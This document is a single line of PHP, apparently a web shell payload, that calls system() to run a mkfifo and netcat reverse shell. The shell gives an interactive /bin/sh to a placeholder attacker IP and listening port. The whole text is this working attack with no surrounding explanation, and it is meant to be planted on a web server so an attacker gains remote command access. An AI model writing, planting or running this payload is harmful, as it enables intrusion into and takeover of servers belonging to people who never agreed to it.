<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {Attack IP} {Listening port} >/tmp/f"); ?>
